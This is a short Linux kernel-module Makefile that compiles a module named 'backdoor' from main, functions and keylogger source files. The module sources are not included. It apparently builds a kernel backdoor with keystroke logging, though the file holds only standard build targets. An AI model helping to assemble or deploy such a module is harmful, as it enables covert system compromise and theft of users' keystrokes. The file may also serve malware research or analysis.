EXTRA_CFLAGS += -Wframe-larger-than=4096

obj-m += backdoor.o

backdoor-objs := src/main.o src/functions.o src/keylogger.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
